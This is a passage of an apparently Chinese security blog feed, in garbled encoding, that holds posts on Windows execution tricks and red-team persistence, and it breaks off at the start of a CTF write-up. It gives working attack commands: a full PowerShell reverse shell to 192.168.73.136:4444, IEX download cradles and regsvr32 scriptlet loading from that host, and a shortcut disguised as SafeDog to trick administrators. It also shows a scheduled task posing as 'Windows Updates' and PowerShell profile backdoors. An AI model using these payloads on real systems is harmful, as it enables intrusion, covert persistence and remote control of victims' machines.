C:\tmp\hacker.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3962395207.png"></p><p>msfå¼€å¯ä¼šè¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1581667678.png"></p><p>æ¯«æ— ç–‘é—®çš„æ˜¯ï¼ŒHacker.exe å°†æ˜¯forfiles.exeå­è¿›ç¨‹ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨windowsè‡ªå¸¦çš„â€œè¿è¡Œâ€æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>Pcaluaï¼š</p><p>è¿›ç¨‹å…¼å®¹æ€§åŠ©æ‰‹æ˜¯Windowså®ç”¨ç¨‹åºï¼Œå½“å®ƒæ£€æµ‹åˆ°å­˜åœ¨å…¼å®¹æ€§é—®é¢˜çš„è½¯ä»¶æ—¶å°±ä¼šè¿è¡Œã€‚è¯¥å®ç”¨ç¨‹åºä½äºâ€œ Cï¼š Windows  System32 â€ä¸­ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨â€œ -aâ€å‚æ•°æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcalua.exe -a C:\tmp\hacker.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1069225407.png"></p><p>msfæ‰“å¼€ä¼šè¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4182407151.png"></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œhacker.exeå°†æ˜¯ä¸€ä¸ªæ–°çš„çˆ¶è¿›ç¨‹ã€‚</p><p>åé¢å°±ä¸ä¸€ä¸€æˆªå›¾äº†ï¼Œå¤§å®¶è‡ªè¡Œä¸‹å»éªŒè¯å°±æ¬§å…‹äº†</p><p>SyncAppvPublishingServerï¼š</p><p>SyncAppvPublishingServer ä¸ºå¯åŠ¨Microsoftåº”ç”¨ç¨‹åºè™šæ‹ŸåŒ–ï¼ˆApp-Vï¼‰å‘å¸ƒåˆ·æ–°æ“ä½œï¼Œåœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œå°†åœ¨powershellä¸­æ‰§è¡Œï¼Œ Start-Process cmdletç”¨äºè¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyncAppvPublishingServer.vbs &quot;n; Start-Process C:\tmp\hacker.exe&quot;</span><br></pre></td></tr></table></figure><p>ç”±äºSyncAppvPublishingServerå°†æ‰§è¡ŒåŒå¼•å·ä¸­åŒ…å«çš„æ‰€æœ‰å†…å®¹ï¼Œå› æ­¤è¿˜å¯ä»¥ä½¿ç”¨â€œ regsvr32 â€æ–¹æ³•ä»è¿œç¨‹ä½ç½®æ‰§è¡Œæ¶æ„æœ‰æ•ˆè´Ÿè½½ã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyncAppvPublishingServer.vbs &quot;Break; regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.73.136:8080&#x2F;jnQl1FJ.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure><p>Explorer:<br>å¯ä»¥å°†explorer.exe ç”¨ä½œæ‰§è¡Œæ–¹æ³•ã€‚æ‰§è¡Œçš„æœ‰æ•ˆè´Ÿè½½å°†åœ¨ç³»ç»Ÿä¸Šåˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹å°†æŠŠexplorer.exeä½œä¸ºçˆ¶è¿›ç¨‹ã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer.exe C:\tmp\hacker.exeexplorer.exe &#x2F;root,&quot;C:\tmp\hacker.exe&quot;explorer.exe 0XAXSDD-Hacker, &quot;C:\tmp\hacker.exe&quot;</span><br></pre></td></tr></table></figure><p>Waitforï¼š<br>waitforæ˜¯MicrosoftäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äºé€šè¿‡å‘é€ä¿¡å·æ¥è·¨ç½‘ç»œåŒæ­¥è®¡ç®—æœºï¼Œä¹Ÿå¯ç”¨äºæ‰§è¡Œä»»æ„å‘½ä»¤æˆ–ä¸‹è½½æœ‰æ•ˆè½½è·ã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waitfor hacker &amp;&amp; PowerShell IEX(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.73.136:8080&#x2F;shell&#39;);</span><br><span class="line">waitfor &#x2F;s 127.0.0.1 &#x2F;si hacker</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1278246816.png"></p><p>å½“ç„¶è¿™é‡Œåªæ€»ç»“äº†ä¸€äº›ï¼Œä¹Ÿæ²¡æ€»ç»“å®Œï¼Œä½†ä¹Ÿå€¼å¾—å­¦ä¹ ä¸æ€è€ƒï¼Œå¸Œæœ›èƒ½ç»™ä½ ä¸€ä¸ªå¥½çš„æ€è·¯ï¼</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€æŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢é˜ŸæŠ€å·§-æŒä¹…æ€§æŠ€å·§</title>
      <link href="2020/09/30/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7/"/>
      <url>2020/09/30/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€œä»Šå¤©ï¼Œæˆ‘å°†ä»‹ç»å…³äºhackeræ‹¿åˆ°ä¸€å°æœåŠ¡å™¨ä¹‹åï¼Œå¦‚ä½•å»ºç«‹æŒä¹…æ€§çš„åé—¨çš„ä¸€äº›éå¸¸å®ç”¨çš„å°æŠ€å·§ï¼â€</p></blockquote><h6 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h6><p>èƒ½ç•™åé—¨çš„å·¥å…·å¾ˆå¤šï¼ŒæŠ€æœ¯æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œä½†æ˜¯ä»Šå¤©æˆ‘å°†ä»‹ç»ä¸€äº›ç®€å•å¹¶ä¸”å¼‚å¸¸å®ç”¨çš„æ–¹æ³•ã€‚</p><h2 id="1-å¿«æ·é“¾æ¥æ–¹å¼"><a href="#1-å¿«æ·é“¾æ¥æ–¹å¼" class="headerlink" title="1.å¿«æ·é“¾æ¥æ–¹å¼"></a>1.å¿«æ·é“¾æ¥æ–¹å¼</h2><p>å¯¹ï¼Œä½ æƒ³çš„æ²¡é”™ï¼Œæˆ‘ä»¬å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œé‡Œé¢çš„é“¾æ¥æ›¿æ¢ä¸Šæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ï¼Œæ¬ºéª—ç®¡ç†å‘˜ç‚¹å‡»ï¼Œè¿è¡Œæˆ‘ä»¬çš„shellå’Œæ‰§è¡Œä»£ç ã€‚</p><p>ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦çš„è§’åº¦æ¥æé«˜æˆ‘ä»¬æ–¹æ³•çš„å¯è¡Œæ€§çš„å‡ ç‚¹ï¼š<br>1.æ›¿æ¢çš„å¿«æ·å›¾æ ‡å¯ä»¥æ”¹æˆä¸€äº›å¸¸ç”¨çš„è½¯ä»¶ï¼Œä½†ä¸ä»…é™äºè½¯ä»¶ï¼Œæé«˜ç®¡ç†å‘˜ç‚¹å‡»çš„å¯èƒ½æ€§ã€‚<br>2.æ”¹å¥½çš„å¿«æ·æ–¹å¼å¯ä»¥æ”¾åœ¨æ¯”è¾ƒæ˜¾çœ¼çš„åœ°æ–¹ï¼Œè¿›ä¸€æ­¥æé«˜å¯èƒ½æ€§ã€‚<br>3.æœ€å¥½ä¸è¦ç”¨ä¸€äº›æ²¡ç”¨è¿‡æˆ–è€…å®‰è£…è¿‡è½¯ä»¶æˆ–è€…å…¶ä»–ä¸œè¥¿çš„å¿«æ·é“¾æ¥ï¼Œè¿™å¯èƒ½ä¼šå¼•èµ·æ€€ç–‘ã€‚<br>4.å¯ä»¥æŸ¥çœ‹ä¸€æ³¢å¸¸ç”¨è½¯ä»¶å®ç”¨é¢‘ç‡è®°å½•ï¼Œæ¯”å¦‚å¯ä»¥ä»360è½¯ä»¶ç®¡å®¶è¿™äº›ç¬¬ä¸‰æ–¹è½¯è€ƒï¼Œä¹Ÿå¯ç›´æ¥æŸ¥çœ‹æ§åˆ¶é¢æ¿ä¸­çš„ç¨‹åºå®ç”¨é¢‘ç‡ã€‚</p><p>æ¼”ç¤ºï¼š<br>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå®‰å…¨ç‹—å¿«æ·é“¾æ¥ï¼š<br>è¿™é‡Œæˆ‘ç”¨æˆ‘çš„windows7è™šæ‹Ÿæœºåˆ›å»ºå®‰å…¨ç‹—çš„å¿«æ·é“¾æ¥å°è¯•å®ç”¨cmd.exeèµ·powershellæ‰§è¡Œåå¼¹shellã€‚<br>è¿™é‡Œæˆ‘ç›´æ¥ç”¨pythonèµ·ä¸ªç®€å•çš„httpæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;192.168.73.136&quot;,4444);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &quot;# &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure><p>æŠŠä¸Šè¿°ä»£ç å¦å­˜ä¸ºshell.ps1<br>ç‚¹å¼€å¿«æ·é“¾æ¥å±æ€§ï¼Œæ›¿æ¢targetä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c â€œpowershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http:&#x2F;&#x2F;192.168.73.136&#x2F;shell.ps1\&quot;);â€</span><br></pre></td></tr></table></figure><p>å†æŠŠå¿«æ·é“¾æ¥å›¾æ ‡æ¢äº†ï¼Œç„¶åä¸€ä¸ªåé—¨å¿«æ·æ–¹å¼å°±åšå¥½äº†</p><blockquote><p><strong>å¼Šç«¯ï¼š</strong>ä½†æ˜¯è¿™ç§æ–¹å¼æœ‰ä¸ªå¾ˆä¸¥é‡çš„å¼Šç«¯ï¼Œå°±æ˜¯æ‰§è¡Œäº†cmd çª—å£ä¼šå¼¹å‡ºæ¥ï¼Œè¿™å°±å¾ˆç‹—å¸¦ï¼ŒæœŸé—´æˆ‘ä¹Ÿæƒ³è¿‡å¦‚ä½•æŠŠè¿™ä¸ªç©æ„å…³æ‰ï¼Œä½†æ˜¯ä»ç†è®ºä¸Šæ„Ÿè§‰ä¸å¤ªè¡Œï¼Œå„ä½å¸ˆå‚…å¯ä»¥è‡ªè¡Œç ”ç©¶ä¸€ç•ªï¼Œæˆ‘å¯èƒ½å¤ªèœäº†ï¼Œæ²¡ç©æ˜ç™½ï¼ç»“æŸcmdè¿›ç¨‹ï¼Œç›¸åº”çš„shellä¹Ÿä¼šæ­»æ‰ï¼ŒæœŸé—´æƒ³è¿‡å„ç§æ–¹å¼ï¼Œæ–¹æ³•ï¼Œä½†éƒ½æ²¡ç”¨ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆçƒ§è„‘çš„ä¸œè¥¿ï¼</p></blockquote><p><strong>ä¼˜åŒ–ï¼š</strong><br>æˆ‘ä»¬å®Œå…¨å¯ä»¥ç”¨æœ¨é©¬å¯æ‰§è¡Œæ–‡ä»¶æ¥æ›¿æ¢cmdæ‰§è¡Œpowershellï¼Œè¿™æ ·åå°å°†ä¸ä¼šæœ‰ä»»ä½•æ“ä½œæ˜¾ç¤ºï¼Œè¿™æ ·éšè”½ä¸€ç‚¹ï¼Œåªéœ€è¦æŠŠæœ¨é©¬å¯æ‰§è¡Œæ–‡ä»¶ç»å¯¹è·¯å¾„æ›¿æ¢æˆé“¾æ¥çš„targetå°±è¡Œäº†ï¼Œè¿™é‡Œä»…æä¾›ä¸€ä¸ªæ€è·¯ï¼Œåç»­ç ”ç©¶å„ä½è¯·ç»§ç»­ã€‚</p><p>ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†ï¼Ÿä¸ï¼Œè¿˜èƒ½ç©ç©ã€‚</p><p>è¿›ä¸€æ­¥ä¼˜åŒ–ï¼š<br>å‰é¢è™½ç„¶æ‰§è¡Œäº†æœ¨é©¬æ–‡ä»¶ï¼Œä½†æ˜¯çœŸæ­£é“¾æ¥çš„ç¨‹åºæˆ‘ä»¬å¹¶æ²¡ç”¨æ‰§è¡Œï¼Œè€Œæ˜¯è¢«æ›¿æ¢æ‰äº†ï¼Œè¿™æ ·å°±ä¼šè®©äººå¼•èµ·æ€€ç–‘ï¼Œå°±ä¼šçŒœæµ‹æ˜¯ä¸æ˜¯è·¯å¾„é”™äº†ï¼Œä¸€æ‰“å¼€å¿«æ·æ–¹å¼å±æ€§ï¼Œç„¶åå°±éœ²é¦…äº†å˜›ï¼Œæ‰€ä»¥æˆ‘åˆè‡ªå·±çå€’è…¾ï¼</p><p>é¦–å…ˆå»ºç«‹ä¸€ä¸ªbatæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@start C:\\Users\\hacker\\Desktop\\msf.exe&#x2F;&#x2F;å¯åŠ¨æ¶æ„ç¨‹åº</span><br><span class="line">@&quot;C:\\Program Files (x86)\SafeDog\SafeDogSiteApache\SafeDogSiteApache.exe&quot; &#x2F;&#x2F;å¯åŠ¨æ­£å¸¸ç¨‹åº</span><br></pre></td></tr></table></figure><p>ç„¶åå¿«æ·æ–¹å¼é“¾æ¥æ¢æˆè¿™ä¸ªbatæ–‡ä»¶çš„é“¾æ¥ï¼Œè¿™æ ·å°†ä¼šå³æ‰§è¡Œäº†åå¼¹shellï¼Œåˆä¼šæ‰§è¡Œæ­£å¸¸ç¨‹åºï¼Œèƒ½æœ‰æ•ˆé™ä½ç®¡ç†å‘˜çš„æ€€ç–‘ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1111221192.png"></p><p>ä½†æ˜¯æœ€åè¿˜æ˜¯ä¼šæœ‰ä¸ªcmdæ¡†ï¼Œéš¾å—ï¼Œä½†æ˜¯æ²¡æ˜¾ç¤ºå‡ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿˜æ˜¯æœ‰ç‚¹ä¼˜åŒ–æ•ˆæœçš„ï¼</p><h2 id="2-è®¡åˆ’ä»»åŠ¡æ–¹å¼"><a href="#2-è®¡åˆ’ä»»åŠ¡æ–¹å¼" class="headerlink" title="2. è®¡åˆ’ä»»åŠ¡æ–¹å¼"></a>2. è®¡åˆ’ä»»åŠ¡æ–¹å¼</h2><p>è®¡åˆ’ä»»åŠ¡æ˜¯ä¸€ä¸ªå¾ˆæ£’çš„åé—¨æ–¹æ³•ï¼Œå› ä¸ºæ ¹æœ¬ä¸éœ€è¦ç”¨æˆ·äº¤äº’ï¼Œä¸éœ€è¦é«˜çš„æƒé™ï¼Œæ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥å†™ï¼Œæ˜¯ä¸€æ¬¾æ˜“äºä½¿ç”¨çš„æ–¹æ³•ã€‚</p><p>è¿™é‡Œæˆ‘è®¾ç½®äº†å®šæ—¶ä»»åŠ¡ï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks  &#x2F;create  &#x2F;tn  testschtask &#x2F;tr C:&#x2F;Users&#x2F;hacker&#x2F;Desktop&#x2F;msf.exe   &#x2F;sc  DAILY &#x2F;st  15:33:00</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä½ å®Œå…¨å¯ä»¥è®¾ç½®ä¸€åˆ†é’Ÿå°±æ‰§è¡Œä¸€æ¬¡ï¼Œä¾‹å¦‚è¿™é‡Œæˆ‘åˆ›å»ºäº†ä¸€ä¸ªwindows updatesä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œä½ åªéœ€è¦æŠŠPATHæ›¿æ¢æˆä½ çš„æ¶æ„ç¨‹åºè·¯å¾„å°±è¡Œäº†ï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;sc minute &#x2F;mo 1 &#x2F;tn &quot;Windows Updates&quot; &#x2F;tr &quot;PATH&quot; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1197887660.png"></p><p>è¿™æ ·æ˜¯éå¸¸niceçš„ï¼Œæ˜¯éå¸¸éšè”½å®ç”¨çš„ï¼Œä½ åªéœ€è¦åœ¨å“ªé‡Œç›‘å¬ï¼Œå°±ä¼šè·å¾—ç”œç¾çš„shellã€‚</p><h2 id="3-Powershellé…ç½®æ–‡ä»¶ï¼š"><a href="#3-Powershellé…ç½®æ–‡ä»¶ï¼š" class="headerlink" title="3. Powershellé…ç½®æ–‡ä»¶ï¼š"></a>3. Powershellé…ç½®æ–‡ä»¶ï¼š</h2><p>PowerShellé…ç½®æ–‡ä»¶æ˜¯ä¸€ä¸ªPowerShellè„šæœ¬ï¼Œæ‚¨å¯ä»¥å¯¹å…¶è¿›è¡Œè‡ªå®šä¹‰ï¼Œå¹¶å°†å…¶ç‰¹å®šäºä¼šè¯çš„å…ƒç´ æ·»åŠ åˆ°æ‚¨å¯åŠ¨çš„æ¯ä¸ªPowerShellä¼šè¯ä¸­ã€‚å®ƒæ˜¯ä¸€ä¸ªåœ¨PowerShellå¯åŠ¨æ—¶è¿è¡Œçš„è„šæœ¬ï¼Œä½ å¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶ä½œä¸ºç™»å½•è„šæœ¬æ¥è‡ªå®šä¹‰ç¯å¢ƒï¼Œä½ å¯ä»¥æ·»åŠ å‘½ä»¤ï¼ŒåŠŸèƒ½ï¼Œåˆ«åï¼Œæ¨¡å—ç­‰ã€‚æ­¤å¤–PowerShellæ”¯æŒå¤šä¸ªé…ç½®æ–‡ä»¶ï¼ŒPowerShellä¸»æœºç¨‹åºå¯ä»¥æ”¯æŒå…¶è‡ªå·±çš„ä¸»æœºç‰¹å®šé…ç½®æ–‡ä»¶ã€‚</p><p>ä¸€äº›æ ·ä¾‹ï¼š<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1344353250.png"></p><p>PowerShellé…ç½®æ–‡ä»¶è„šæœ¬å­˜å‚¨åœ¨æ–‡ä»¶å¤¹â€œ WindowsPowerShelâ€ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯¹ç”¨æˆ·éšè—ã€‚å¦‚æœæœ‰æ•ˆè´Ÿè½½å·²æ”¾å…¥ç£ç›˜ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ã€‚</p><p>cmdletæŒ‡å‘å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®ï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start-Process</span><br></pre></td></tr></table></figure><p>ç¡®å®šå½“å‰ç”¨æˆ·çš„é…ç½®æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test-Path $ profile</span><br></pre></td></tr></table></figure><p>å¦‚æœé…ç½®æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°†ä¸ºå½“å‰ç”¨æˆ·åˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new-Item -Path $ Profile -Type File -Force</span><br></pre></td></tr></table></figure><p>é‡å†™è¯¥é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out-File</span><br></pre></td></tr></table></figure><p>æ¼”ç¤ºï¼š</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3630881312.png"></p><p>è¿™æ ·æˆ‘æ¯æ‰“å¼€ä¸€ä¸ªæ–°çš„powershellçª—å£ï¼Œå°†ä¼šæ‰§è¡Œæ¶æ„ç¨‹åºï¼<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/136724488.png"></p><p>æ¼”ç¤ºæ‰€ç”¨çš„å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">test-Path $profile</span><br><span class="line">new-Item -Path $profile -Type File â€“Force</span><br><span class="line">$string &#x3D; &#39;Start-Process &quot;C:\\Users\\hacker\Desktop\\msf.exe&quot;&#39;</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append</span><br></pre></td></tr></table></figure><p>ä¸å¯åŠ¨è¿›ç¨‹ç±»ä¼¼ï¼Œâ€œ Invoke-Item â€ cmdletå¯ç”¨äºæ‰§è¡Œé¡¹ç›®çš„é»˜è®¤æ“ä½œï¼Œå³è¿è¡Œæ–‡ä»¶ï¼Œæ‰“å¼€åº”ç”¨ç¨‹åºç­‰ã€‚launcher.batæ˜¯Empireç”Ÿæˆçš„æœ‰æ•ˆè´Ÿè½½ï¼Œå…·æœ‰è‡ªæˆ‘åˆ é™¤çš„èƒ½åŠ›ä½œä¸ºæ›´ç§˜å¯†çš„é€‰æ‹©æ‰§è¡Œæ—¶ï¼Œå› ä¸ºå®ƒä¸ä¼šåˆ›å»ºæ–°è¿›ç¨‹ã€‚</p><p>æ‰€éœ€è¦çš„å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">test-Path $profile</span><br><span class="line">new-Item -Path $profile -Type File â€“Force</span><br><span class="line">add-Content $profile &quot;Invoke-Item C:\tmp\launcher.bat&quot;</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append</span><br></pre></td></tr></table></figure><p>è¿™æ ·å½“PowerShellåœ¨ç³»ç»Ÿä¸Šå†æ¬¡å¯åŠ¨æ—¶ï¼Œå°†æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œå¹¶ä¸”ä»£ç†å°†ä¸å‘½ä»¤å’Œæ§ä»¶è¿›è¡Œé€šè®¯ã€‚æ‰§è¡Œè¿‡ç¨‹ä¸ä¼šåƒä¸Šé¢çš„ç¤ºä¾‹é‚£æ ·åœ¨ç³»ç»Ÿä¸Šåˆ›å»ºæ–°è¿›ç¨‹ï¼Œè€Œæ˜¯ä½¿ç”¨ç°æœ‰çš„PowerShellè¿›ç¨‹ï¼Œæ›´ä¸ºéšè”½ã€‚</p><p>cmdletâ€œ Invoke-Command â€çš„ç”¨æ³•ä¸­å…è®¸æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥regsvr32æ–¹æ³•å¯ä»¥ç”¨ä½œéšè—é€‰é¡¹ï¼Œå› ä¸ºå®ƒå¯ä»¥è§„é¿æœªæ­£ç¡®é…ç½®çš„åº”ç”¨ç¨‹åºç™½åå•è§£å†³æ–¹æ¡ˆï¼Œå¹¶ä¸”å¯ä»¥ä»è¿œç¨‹æ‰§è¡Œscriptletã€‚</p><p>å‚è€ƒå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">test-Path $profile</span><br><span class="line">new-Item -Path $profile -Type File â€“Force</span><br><span class="line">$string &#x3D; &#39;Invoke-Command -ScriptBlock &#123; regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.73.136:80&#x2F;jWcEbr.sct scrobj.dll &#125;&#39;</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShel</span><br></pre></td></tr></table></figure><p>Metasploitæ¡†æ¶åŒ…å«ä¸€ä¸ªæ¨¡å—ï¼ˆweb_deliveryï¼‰ï¼Œè¯¥æ¨¡å—å¯ä»¥ç”Ÿæˆå¹¶æä¾›æ¶æ„scriptletæ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå…¶ä»–å‘½ä»¤æˆ–è€…æ§åˆ¶ï¼ˆC2ï¼‰æ¡†æ¶ï¼ˆä¾‹å¦‚PoshC2ï¼‰ä¹Ÿæ”¯æŒæ­¤åŠŸèƒ½ï¼Œå¹¶ä¸”ä¸Metasploitç›¸æ¯”ï¼Œå¯ä»¥æä¾›æ‰©å±•çš„åŠŸèƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1251912728.png"></p><p>æ³¨æ„ï¼šä½¿ç”¨å¤šä¸ªå‘½ä»¤å¯¹PowerShellé…ç½®æ–‡ä»¶è¿›è¡Œå¤§é‡ä¿®æ”¹ä¼šå‘ç”¨æˆ·å‘é€ä¸€æ¡æœ‰å…³å¢åŠ åŠ è½½æ—¶é—´çš„æ¶ˆæ¯ã€‚ä½†æ˜¯ï¼Œæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ä¸ä¼šäº§ç”Ÿä»»ä½•æ¶ˆæ¯ï¼Œæœ‰æ•ˆè´Ÿè½½å°†åœ¨åå°è¿è¡Œï¼Œå¹¶ä¸”ç”¨æˆ·ä¸ä¼šæ³¨æ„åˆ°ä»»ä½•å¼‚å¸¸ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCTF Final WP</title>
      <link href="2020/09/29/TCTF%20Final%20WP/"/>
      <url>2020/09/29/TCTF%20Final%20WP/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h1><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªrubyè§£é‡Šå™¨<a href="https://github.com/embedded2015/rubi%EF%BC%8C%E5%B9%B6%E5%AF%B9%E5%AE%83%E5%81%9A%E4%BA%86patch%EF%BC%9A">https://github.com/embedded2015/rubiï¼Œå¹¶å¯¹å®ƒåšäº†patchï¼š</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/engine.c b/engine.c</span><br><span class="line">index 79e83d2.<span class="number">.2350</span>d59 <span class="number">100644</span></span><br><span class="line">--- a/engine.c</span><br><span class="line">+++ b/engine.c</span><br><span class="line"><span class="meta">@@ -<span class="number">137</span>,<span class="number">6</span> +<span class="number">137</span>,<span class="number">11</span> @@ static int execute(<span 